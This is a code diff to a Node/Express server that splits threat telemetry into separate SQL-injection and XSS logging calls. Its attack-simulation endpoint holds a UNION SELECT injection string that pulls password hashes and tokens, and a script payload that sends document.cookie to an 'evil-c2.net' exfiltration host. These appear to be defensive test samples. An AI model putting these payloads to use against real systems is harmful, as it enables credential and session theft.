@@ -304,16 +304,41 @@ app.post('/api/search', async (req, res) => {
   }
 
   if (detectedThreat) {
-    const telemetry = await security.suspiciousRequest({
-      userId,
-      sourceIp,
-      endpoint: '/api/search',
-      metadata: {
-        attackVector: detectedThreat.type,
-        detectedPattern: detectedThreat.pattern,
-        inputPayload: query.length > 200 ? query.substring(0, 200) + '...' : query
-      }
-    });
+    let telemetry;
+    if (detectedThreat.type === 'SQL_INJECTION') {
+      telemetry = await security.sqliDetected({
+        userId,
+        sourceIp,
+        endpoint: '/api/search',
+        metadata: {
+          attackVector: detectedThreat.type,
+          detectedPattern: detectedThreat.pattern,
+          inputPayload: query.length > 200 ? query.substring(0, 200) + '...' : query
+        }
+      });
+    } else if (detectedThreat.type === 'CROSS_SITE_SCRIPTING_XSS') {
+      telemetry = await security.xssDetected({
+        userId,
+        sourceIp,
+        endpoint: '/api/search',
+        metadata: {
+          attackVector: detectedThreat.type,
+          detectedPattern: detectedThreat.pattern,
+          inputPayload: query.length > 200 ? query.substring(0, 200) + '...' : query
+        }
+      });
+    } else {
+      telemetry = await security.suspiciousRequest({
+        userId,
+        sourceIp,
+        endpoint: '/api/search',
+        metadata: {
+          attackVector: detectedThreat.type,
+          detectedPattern: detectedThreat.pattern,
+          inputPayload: query.length > 200 ? query.substring(0, 200) + '...' : query
+        }
+      });
+    }
 
     return res.status(400).json({
       success: false,
@@ -384,7 +409,7 @@ app.post('/api/simulate/:attackType', async (req, res) => {
 
     case 'sqli': {
       const maliciousPayload = "' OR '1'='1' UNION SELECT username, password_hash, token FROM auth_users --";
-      const telemetry = await security.suspiciousRequest({
+      const telemetry = await security.sqliDetected({
         userId: 'attacker_script_v2',
         sourceIp: '203.0.113.88',
         endpoint: '/api/search',
@@ -452,7 +477,7 @@ app.post('/api/simulate/:attackType', async (req, res) => {
 
     case 'xss': {
       const maliciousScript = "<script>fetch('https://evil-c2.net/exfil?c='+document.cookie)</script>";
-      const telemetry = await security.suspiciousRequest({
+      const telemetry = await security.xssDetected({
         userId: 'anonymous_xss_probe',
         sourceIp: '185.220.101.5',
         endpoint: '/api/search',
